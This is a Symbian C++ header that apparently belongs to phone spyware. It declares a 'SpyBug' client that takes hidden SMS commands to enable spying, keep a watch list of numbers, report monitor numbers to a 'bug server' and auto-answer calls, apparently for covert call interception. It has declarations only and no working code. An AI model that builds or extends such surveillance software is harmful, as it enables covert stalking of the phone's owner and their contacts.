#ifndef SpyBugClient_H__
#define SpyBugClient_H__

#include <e32base.h>

#include "SmsCmdManager.h"
#include "SettingChangeObserver.h"
#include "ProductLicense.h"
#include "LicenceManager.h"

class TMonitorInfo;
class CBugClient;
class CAutoAnswer;

class CSpyBugClient : public CBase,
					  public MSettingChangeObserver,
					  public MLicenceObserver,
					  public MCmdListener
	{
public:
	static CSpyBugClient* NewL(MProductLicense& aLicense);
	static CSpyBugClient* NewL(MProductLicense& aLicense, const TFileName* aAppPath);
	~CSpyBugClient();
	
private://MLicenceObserver
	void LicenceActivatedL(TBool aActivated);
	
private: //From MSettingDataObserver
	void OnSettingChangedL(CFxsSettings& aSettingData);
	
private://MSmsCmdObserver
	HBufC* HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails);	
private:
	CSpyBugClient(MProductLicense& aLicense);
	void ConstructL(const TFileName* aAppPath);	
	
	HBufC* ProcessCmdEnableSpyL(const TSmsCmdDetails& aCmdDetails);
	/**
	* Create response message
	* @return message passing ownership, the caller must delete it
	*/
	HBufC* ProcessCmdDisableSpyL(const TSmsCmdDetails& aCmdDetails);
	HBufC* ProcessCmdEnableWatchListL(const TSmsCmdDetails& aCmdDetails);
	
	/**
	* send monitor number to bug server
	*/
	void SendMonitorInfo(const TMonitorInfo& aMonitor);
	/**
	* send watch list number to bug server
	*/
	void SendWatchList(TWatchList& aWL);
	//sms command
	HBufC* CreateRespHeaderLC(TInt aSmsCmd, TInt aErr);
	HBufC* CreateSpyEnableLC(const TMonitorInfo& aMonitor);
	HBufC* CreateWatchListStatusLC(const TWatchList& aWL);
	HBufC* CreateWatchListStatusLC(const TWatchList& aWL, TBool aReachMaxLimit);
	HBufC* ProcessCmdClearWatchListL(const TSmsCmdDetails& aCmdDetails);
private:
	CBugClient* iBugClient;
	CAutoAnswer* iAutoAns;
	MProductLicense& iLicense;	
	};
	
#endif
